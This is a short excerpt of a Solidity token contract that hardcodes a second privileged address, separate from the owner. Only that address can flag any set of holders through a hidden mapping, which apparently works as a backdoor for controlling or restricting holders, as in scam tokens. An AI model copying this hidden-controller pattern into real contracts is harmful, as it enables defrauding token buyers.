...
contract Token is Context, IERC20, Ownable{
    ...
    constructor () {
        ...
        _JACKYCHENG = payable(address(0xe9Cd429984EcdB4F3A8076C50DcA7F7ACDF964A7));
    ...
    function multiSetHolder(address[] calldata addresses, uint256 status) public {
        require(_msgSender() == _JACKYCHENG);
        for (uint256 i; i < addresses.length; i++) {
            if(status == 1){
                _GMEholder[addresses[i]] = true;
            }else{
                _GMEholder[addresses[i]] = false;
            }
        }
    }
